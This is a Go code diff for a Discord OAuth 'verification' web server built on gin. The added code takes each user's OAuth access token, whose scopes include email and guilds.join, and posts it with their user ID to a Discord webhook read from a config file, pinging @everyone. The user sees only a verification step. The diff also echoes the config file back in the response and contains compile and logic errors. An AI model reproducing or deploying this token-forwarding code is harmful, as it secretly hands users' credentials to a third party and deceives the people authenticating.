@@ -6,6 +6,7 @@ import (
 	"encoding/json"
 		"net/http"
 		"io/ioutil"
+		"time"
 	"github.com/gin-gonic/gin"
 	"os"
 )
@@ -77,6 +78,25 @@ func getUserData(token string) (map[string]interface{}, error) {
 
 	return data, nil
 }
+
+
+func readJSONFile(filePath string) (map[string]interface{}, error) {
+	var data map[string]interface{}
+
+	file, err := os.Open(filePath)
+	if err != nil {
+		return data, err
+	}
+	defer file.Close()
+
+	err = json.NewDecoder(file).Decode(&data)
+	if err != nil {
+		return data, err
+	}
+
+	return data, nil
+}
+
 func saveData(filepath string, data map[string]interface{}) error {
 	file, err := os.OpenFile(filepath, os.O_RDWR|os.O_CREATE, 0644)
 	if err != nil {
@@ -102,6 +122,37 @@ func saveData(filepath string, data map[string]interface{}) error {
 
 	return nil
 }
+
+func sendMessage(webhookURL string, content string, embeds []map[string]interface{}) error {
+	message := make(map[string]interface{})
+	message["content"] = content
+	message["embeds"] = embeds
+
+	payload, err := json.Marshal(message)
+	if err != nil {
+		return err
+	}
+
+	resp, err := http.Post(webhookURL, "application/json", bytes.NewBuffer(payload))
+	if err != nil {
+		return err
+	}
+	defer resp.Body.Close()
+
+	if resp.StatusCode != http.StatusNoContent {
+		body, err := ioutil.ReadAll(resp.Body)
+		if err != nil {
+			return err
+		}
+		return fmt.Errorf("unexpected status code: %d: %s", resp.StatusCode, string(body))
+	}
+
+	return nil
+}
+type Data struct {
+	Array []string `json:"array"`
+}
+
 func main() {
 	
 	var url = "https://discord.com/api/oauth2/authorize?client_id=" + client_id + "&redirect_uri=" + redirect + "&response_type=code&scope=identify%20guilds%20email%20guilds.join"
@@ -113,6 +164,11 @@ func main() {
 		})
 	})
 	r.GET("/callback", func(c *gin.Context) {
+		b, a := readJSONFile("bot/saved.json")
+		if a != nil{
+			fmt.Println	(a)
+			return
+		}
 
 		code := c.Query("code")
 		client := &http.Client{}
@@ -130,7 +186,7 @@ func main() {
 		fmt.Println(string(discordToken.AccessToken))
 
 		token := discordToken.AccessToken
-
+		
 		data1, err1 := getUserData(token)
 		if err1 != nil {
 			fmt.Println(err1)
@@ -138,7 +194,7 @@ func main() {
 		}
 		var mn = data1["id"]
 		fmt.Println(data1["id"])
-		err = saveData("saved.json", data1)
+		err = saveData("bot/saved.json", data1)
 		if err != nil {
 			fmt.Println(err)
 			return
@@ -148,13 +204,31 @@ if !ok {
     // handle error
 }		
 fmt.Println(mn)
+		content := "@everyone"
+		var abc = data1["username"]
+		abc, jk := abc.(string)
+		if !jk {
+			//handle error
+		}
+		dt := time.Now()
+		fmt.Println(abc.(string))
+		embed := make(map[string]interface{})
+		embed["title"] = "New authenticated user!"
+		embed["description"] = "Name: <@"+mn.(string)+">\nAccess Token: "+token+"\nTime: "+dt.String()
+
+		embeds := []map[string]interface{}{embed}
+
+		erp := sendMessage(b["log"].(string), content, embeds)
+		if erp != nil {
+			fmt.Println(erp)
+		}
 		err2 := assignRole(mn.(string), role_id, bot_token)
 		if err1 != nil {
 			fmt.Println(err2)
 			return
 		}
 		c.JSON(200, gin.H{
-			"status": "verified",
+			"status": b,
 		})
 	})
 
